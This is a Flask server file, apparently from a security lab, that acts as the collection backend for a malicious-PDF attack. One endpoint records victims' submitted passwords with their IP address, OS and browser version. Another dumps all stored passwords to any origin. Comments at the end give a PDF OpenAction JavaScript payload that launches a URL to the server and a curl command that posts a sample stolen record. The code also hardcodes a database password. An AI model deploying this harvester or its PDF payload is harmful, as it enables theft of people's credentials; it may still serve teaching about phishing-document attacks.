# app.py
from flask import Flask, request, jsonify
from flask_cors import CORS
import mysql.connector

app = Flask(__name__)

CORS(app, resources={r'/*': {'origins': '*'}})

mydb = mysql.connector.connect(
  host="localhost",
  user="pdfhacker",
  password="ITKBWiCF",
  database="pdfdatos"
)


print(mydb)


@app.route("/api/grida", methods=["GET","POST"])

def get_data():
    mycursor = mydb.cursor()
    mycursor.execute("SELECT * FROM datos")
    myresult = mycursor.fetchall()
    payload = []
    content = {}
    for result in myresult:
        content = {'id':result[4],'contrasenia': result[0], 'dip': result[1], 'so': result[2], 'version': result[3]}
        payload.append(content)
        content = {}
    print(payload)
    return jsonify(payload)

@app.route('/api/load', methods=["GET","POST"])
def post_datos():
    json_data = request.get_data(as_text=True).strip().split("&")
    print(json_data)
    dip = request.remote_addr
    print(dip)
    psw= json_data[1].split("=")[0]
    print(psw)
    so = request.user_agent.platform
    print(so)
    ver = request.user_agent.version
    print(ver)
    mycursor = mydb.cursor()
    mycursor.execute("INSERT INTO datos(contraseña, dip, so, version) VALUES (%s,%s,%s,%s);"
    , (psw,dip,so,ver))
    mydb.commit()
    mycursor.close()
    return '200 Ingreso exitoso'

#/OpenAction << /S /JavaScript /JS (app.launchURL("http://127.0.0.1:5000/api/grida") >>
#curl -X POST -d 'dip=164.223.201.17&psw=lab5&so=Linux&ver=20.4' http://127.0.0.1:5000/api/load